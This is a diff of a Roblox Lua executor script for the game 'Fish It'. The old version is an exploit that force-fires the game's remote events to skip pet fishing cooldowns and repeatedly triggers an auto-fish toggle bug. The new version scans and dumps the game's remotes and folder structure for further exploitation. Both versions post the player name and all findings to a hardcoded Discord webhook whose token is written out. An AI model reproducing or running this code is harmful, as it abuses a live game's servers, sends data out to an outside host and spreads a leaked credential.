@@ -1,269 +1,162 @@
---[[
-    Fish It - Pet Fishing Exploit Analyzer & Bug Trigger
-    Untuk executor Android (Delta, CodeX, Arceus, dll.)
-    Webhook Discord untuk log realtime: sudah diset.
-    Gunakan dengan bijak di mode stress test.
-]]
+-- // DIAGNOSTIC SCANNER v1.0 untuk Fish It
+-- // Output: Discord Webhook real-time
+-- // Pastikan kamu sudah di dalam game.
 
 local webhook = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY"
 
--- Fungsi kirim log ke Discord
-local function sendLog(msg)
+-- Fungsi kirim ke Discord (kompatibel Delta/CodeX)
+local function sendDiscord(msg, title)
     local payload = {
-        content = "```lua\n" .. tostring(msg) .. "\n```"
+        content = msg or "",
+        embeds = title and {{
+            title = title,
+            description = msg,
+            color = 0x00ff00
+        }} or nil
     }
     local body = game:GetService("HttpService"):JSONEncode(payload)
-    local suc, err = pcall(function()
-        syn.request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
+    local ok, err = pcall(function()
+        -- Gunakan http_request (lebih universal)
+        if http_request then
+            http_request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        elseif syn and syn.request then
+            syn.request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        else
+            -- fallback ke request (executor lama)
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end
     end)
-    if not suc then
-        warn("Gagal kirim webhook: " .. err)
+    if not ok then
+        warn("Webhook gagal: " .. tostring(err))
     end
 end
 
--- Tunggu game fully loaded
+-- Tunggu game siap
 repeat task.wait() until game:IsLoaded()
-
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
+local RS = game:GetService("ReplicatedStorage")
+local WS = game:GetService("Workspace")
+local LP = Players.LocalPlayer
 
-sendLog("Script dimulai. Target: " .. LocalPlayer.Name)
+sendDiscord("Script diagnostik dimulai. Player: " .. LP.Name, "🔍 DIAGNOSTIC START")
 
--- Cari folder/remote yang mengatur pet/fishing (sesuaikan dengan struktur game)
--- Biasanya di ReplicatedStorage ada remotes seperti FishingSystem, PetSystem, dll.
-local remotes = {}
-local function scanRemotes(parent, depth)
-    if depth > 5 then return end
-    for _, obj in pairs(parent:GetChildren()) do
+-- Fungsi untuk memindai semua descendants dan mencari remote/keywords
+local function scanRemote(parent, depth, results)
+    if depth > 8 then return end
+    for _, obj in ipairs(parent:GetChildren()) do
+        local fullName = obj:GetFullName()
         if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(remotes, obj)
-            sendLog("Ditemukan remote: " .. obj:GetFullName())
+            table.insert(results, {type=obj.ClassName, name=obj.Name, path=fullName})
         end
-        if obj:IsA("Folder") or obj:IsA("Model") then
-            scanRemotes(obj, depth+1)
+        -- rekursi ke folder/model
+        if obj:IsA("Folder") or obj:IsA("Model") or obj:IsA("Configuration") then
+            scanRemote(obj, depth+1, results)
         end
     end
 end
-scanRemotes(ReplicatedStorage, 0)
 
--- Identifikasi remote yang relevan (PetCast, PetReel, ToggleAutoFish, dll.)
--- Biasanya ada remote bernama "PetStartFishing", "PetEndFishing", "AutoFishToggled"
-local petStart, petEnd, autoToggle
-for _, r in pairs(remotes) do
-    local ln = r.Name:lower()
-    if ln:find("pet") and (ln:find("start") or ln:find("cast")) then
-        petStart = r
-        sendLog("Remote PetStart: " .. r.Name)
-    elseif ln:find("pet") and (ln:find("end") or ln:find("reel") or ln:find("catch")) then
-        petEnd = r
-        sendLog("Remote PetEnd: " .. r.Name)
-    elseif ln:find("auto") and ln:find("fish") then
-        autoToggle = r
-        sendLog("Remote AutoFish Toggle: " .. r.Name)
+local foundRemotes = {}
+scanRemote(game, 0, foundRemotes)
+
+-- Filter yang mengandung kata kunci
+local keywords = {"fish", "pet", "auto", "cast", "reel", "catch", "hook", "bait"}
+local filtered = {}
+for _, r in ipairs(foundRemotes) do
+    local lower = r.name:lower()
+    for _, kw in ipairs(keywords) do
+        if lower:find(kw) then
+            table.insert(filtered, r)
+            break
+        end
     end
 end
 
--- Jika remote tidak ditemukan, cari manual dengan nama umum
-if not petStart then
-    -- fallback cari di ReplicatedStorage.FishingSystem atau PetSystem
-    local petSys = ReplicatedStorage:FindFirstChild("PetSystem") or ReplicatedStorage:FindFirstChild("PetHandler")
-    if petSys then
-        petStart = petSys:FindFirstChild("StartFishing") or petSys:FindFirstChild("Cast")
-        petEnd = petSys:FindFirstChild("EndFishing") or petSys:FindFirstChild("Reel") or petSys:FindFirstChild("Catch")
-        sendLog("Fallback PetStart: " .. tostring(petStart))
-        sendLog("Fallback PetEnd: " .. tostring(petEnd))
+-- Kirim semua remote (maks 1900 karakter per pesan)
+local msg = "**SEMUA REMOTE DITEMUKAN (" .. #foundRemotes .. "):**\n```\n"
+for i, r in ipairs(foundRemotes) do
+    local line = string.format("[%d] %s %s\n", i, r.type, r.path)
+    if #msg + #line > 1900 then
+        msg = msg .. "```"
+        sendDiscord(msg)
+        msg = "```\n"
     end
+    msg = msg .. line
+end
+if msg ~= "```\n" then
+    msg = msg .. "```"
+    sendDiscord(msg)
 end
 
--- Pemantauan state pet lokal (bisa melalui PlayerScripts atau UI)
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
--- Cari elemen UI yang menampilkan cooldown pet (biasanya progress bar atau text)
-local petUI = playerGui:FindFirstChild("PetUI") or playerGui:FindFirstChild("FishingHUD")
-if petUI then
-    sendLog("Pet UI ditemukan: " .. petUI:GetFullName())
-end
-
--- Variabel untuk tracking cooldown
-local petCooldownData = {} -- {petName: {lastStart, expectedDuration, actualDuration, bugCount}}
-local function recordPetStart(petName, expectedDuration)
-    petCooldownData[petName] = {
-        lastStart = tick(),
-        expected = expectedDuration,
-        started = true
-    }
-end
-local function recordPetEnd(petName)
-    local data = petCooldownData[petName]
-    if not data or not data.started then return end
-    local actual = tick() - data.lastStart
-    data.actual = actual
-    data.started = false
-    local info = ("[%s] Cooldown seharusnya: %.1fs, Real: %.1fs, Selisih: %.1fs"):format(petName, data.expected, actual, data.expected - actual)
-    sendLog(info)
-    if actual < data.expected * 0.8 then
-        sendLog("BUG TERDETEKSI pada " .. petName .. "! Cooldown lebih cepat dari seharusnya!")
-        data.bugCount = (data.bugCount or 0) + 1
+-- Kirim yang terfilter
+if #filtered > 0 then
+    local fmsg = "**REMOTE DENGAN KATA KUNCI (" .. #filtered .. "):**\n```\n"
+    for _, r in ipairs(filtered) do
+        fmsg = fmsg .. r.path .. "\n"
     end
-    -- Jika actual sangat kecil (<1 detik) berarti exploit max speed mungkin terjadi
-    if actual < 1 then
-        sendLog("EXPLOIT POTENSIAL: " .. petName .. " menyelesaikan dalam <1 detik!")
-    end
+    fmsg = fmsg .. "```"
+    sendDiscord(fmsg, "🎯 KEYWORD MATCH")
+else
+    sendDiscord("Tidak ada remote dengan kata kunci fish/pet/auto/dll. Perlu pencarian manual.")
 end
 
--- Hook fungsi remote client-side (jika perlu memonitor panggilan)
--- Karena kita di executor, kita bisa pakai hookfunction pada FireServer/InvokeServer
-local oldFire = remote.FireServer
-if petStart then
-    local originalPetStart = petStart.OnServerEvent -- tapi ini server, kita perlu hook client-side?
-    -- Kita bisa hook remote event yang ada di ReplicatedStorage yang dipanggil oleh LocalPlayer
-    -- Lebih mudah: kita pantau perubahan UI cooldown bar.
-end
-
--- Kalau tidak bisa hook remote, kita pantau perubahan properties pada pet objek di workspace.
-local workspace = game:GetService("Workspace")
-local petsFolder = workspace:FindFirstChild("Pets") or workspace:FindFirstChild("AllPets")
-if petsFolder then
-    sendLog("Folder Pets ditemukan di workspace.")
-    for _, petModel in pairs(petsFolder:GetChildren()) do
-        if petModel:IsA("Model") then
-            local humanoid = petModel:FindFirstChildOfClass("Humanoid")
-            local info = petModel.Name .. " ditemukan. Memonitor state..."
-            sendLog(info)
-            -- Kaitkan ke event animation atau attribute changes
-            local stateScript = petModel:FindFirstChild("StateScript") or petModel:FindFirstChild("FishingState")
-            if stateScript then
-                -- ...
+-- Pindai struktur folder penting
+local function dumpFolderStructure(parent, depth, output)
+    local indent = string.rep("  ", depth)
+    for _, child in ipairs(parent:GetChildren()) do
+        local info = indent .. child.Name .. " (" .. child.ClassName .. ")"
+        table.insert(output, info)
+        if child:IsA("Folder") or child:IsA("Model") then
+            if #child:GetChildren() > 0 and depth < 4 then
+                dumpFolderStructure(child, depth+1, output)
             end
         end
     end
 end
 
--- Auto-trigger bug: Toggle auto-fishing cepat untuk memicu skip cooldown
-local function triggerBug()
-    if autoToggle then
-        sendLog("Memicu bug: Toggle Auto-Fish cepat...")
-        for i=1, 5 do
-            autoToggle:FireServer(true) -- asumsikan parameter true = on
-            task.wait(0.05)
-            autoToggle:FireServer(false) -- off
-            task.wait(0.05)
-        end
-    else
-        sendLog("Remote AutoFish toggle tidak ditemukan! Cari manual atau gunakan UI button.")
-        -- Coba cari button AutoFish di screen
-        local autoBtn = nil
-        for _, obj in pairs(playerGui:GetDescendants()) do
-            if obj:IsA("TextButton") and obj.Name:lower():find("auto") then
-                autoBtn = obj
-                break
-            end
-        end
-        if autoBtn then
-            sendLog("Tombol Auto-Fish ditemukan, akan diklik cepat.")
-            for i=1, 5 do
-                fireclickbutton(autoBtn)
-                task.wait(0.05)
-            end
-        end
-    end
+-- ReplicatedStorage
+local rsStructure = {}
+dumpFolderStructure(RS, 0, rsStructure)
+sendDiscord("**ReplicatedStorage Structure:**\n```\n" .. table.concat(rsStructure, "\n"):sub(1,1900) .. "\n```", "📁 RS STRUCTURE")
+
+-- PlayerScripts
+local ps = LP:WaitForChild("PlayerScripts", 5)
+if ps then
+    local psStructure = {}
+    dumpFolderStructure(ps, 0, psStructure)
+    sendDiscord("**PlayerScripts Structure:**\n```\n" .. table.concat(psStructure, "\n"):sub(1,1900) .. "\n```", "📁 PS STRUCTURE")
 end
 
--- Loop monitoring: deteksi otomatis saat pet mulai fishing dengan melihat UI
-local function monitorUI()
-    if not petUI then return end
-    -- Asumsikan ada ProgressBar untuk setiap pet, dengan nama PetName_Cooldown
-    for _, child in pairs(petUI:GetDescendants()) do
-        if child:IsA("Frame") then -- container pet
-            local petName = child.Name
-            local cdBar = child:FindFirstChild("Cooldown") or child:FindFirstChild("Progress")
-            if cdBar and cdBar:IsA("GuiObject") then
-                local txtLabel = child:FindFirstChild("PetName") or child:FindFirstChild("Title")
-                if txtLabel then petName = txtLabel.Text end
-                local barSize = cdBar.Size
-                -- Deteksi jika bar mulai terisi (artinya fishing dimulai)
-                if cdBar:GetAttribute("Active") then
-                    recordPetStart(petName, tonumber(cdBar:GetAttribute("MaxDuration")))
-                end
-                -- Deteksi jika bar penuh (fishing selesai)
-                if cdBar:GetAttribute("Completed") then
-                    recordPetEnd(petName)
-                end
-            end
-        end
-    end
+-- PlayerGui
+local pg = LP:WaitForChild("PlayerGui", 5)
+if pg then
+    local pgStructure = {}
+    dumpFolderStructure(pg, 0, pgStructure)
+    sendDiscord("**PlayerGui Structure:**\n```\n" .. table.concat(pgStructure, "\n"):sub(1,1900) .. "\n```", "📁 PG STRUCTURE")
 end
 
--- Implementasi actual: hook ke metode yang dipanggil saat fish selesai
--- Kita bisa memanfaatkan remote PetEnd untuk mempercepat proses
-local function speedHackPet(petName)
-    -- Kirim langsung event PetEnd tanpa menunggu cooldown
-    if petEnd then
-        sendLog("Mengirim PetEnd untuk " .. petName .. " secara paksa!")
-        petEnd:FireServer(petName)
+-- Workspace (hanya folder utama)
+local wsChildren = {}
+for _, child in ipairs(WS:GetChildren()) do
+    if child:IsA("Folder") or child:IsA("Model") then
+        table.insert(wsChildren, child.Name .. " (" .. child.ClassName .. ")")
     end
 end
+sendDiscord("**Workspace Folders:**\n```\n" .. table.concat(wsChildren, "\n") .. "\n```", "📁 WS FOLDERS")
 
--- Auto speed loop: setiap X detik, kirim PetEnd untuk semua pet yang sedang memancing
-local function autoSpeedExploit()
-    while true do
-        -- Cek semua pet yang kita miliki dari data
-        for petName, data in pairs(petCooldownData) do
-            if data.started then
-                -- Jika sudah berjalan lebih dari 1 detik, kita paksa end
-                if tick() - data.lastStart > 1 then
-                    speedHackPet(petName)
-                    task.wait(0.2)
-                end
-            end
-        end
-        task.wait(0.5)
-    end
-end
-
--- Fungsi untuk mencari semua pet milik LocalPlayer dari data game
-local function getOwnedPets()
-    -- Bisa dari LocalPlayer.PlayerScripts.PetData atau semacamnya
-    local player = LocalPlayer
-    local petDataModule = player:FindFirstChild("PetData") or player.PlayerScripts:FindFirstChild("PetData")
-    if petDataModule and petDataModule.Value then
-        return petDataModule.Value -- asumsi berisi table
-    end
-    -- Fallback: lewat remote GetOwnedPets
-    local getPetsRemote = ReplicatedStorage:FindFirstChild("GetPets")
-    if getPetsRemote then
-        local pets = getPetsRemote:InvokeServer()
-        return pets
-    end
-    return {}
-end
-
-local myPets = getOwnedPets()
-sendLog("Pet yang dimiliki: " .. table.concat(myPets, ", "))
-
--- Mulai auto exploit setelah 5 detik (untuk memastikan semua siap)
-task.wait(5)
-sendLog("Memulai monitoring dan auto-exploit...")
--- triggerBug() -- Uncomment kalau ingin langsung trigger bug manual
-coroutine.wrap(autoSpeedExploit)()
-
--- Loop monitoring UI
-RunService.Heartbeat:Connect(function()
-    monitorUI()
-end)
-
--- Aktifkan auto-trigger bug setiap 30 detik untuk mempertahankan state bug
-task.spawn(function()
-    while true do
-        task.wait(30)
-        triggerBug()
-    end
-end)
-
-sendLog("Script siap. Pantau Discord untuk log realtime.")
+sendDiscord("Diagnostik awal selesai. Cek Discord untuk data lengkap.", "✅ SCAN COMPLETE")
+print("Diagnostic scan sent to Discord.")
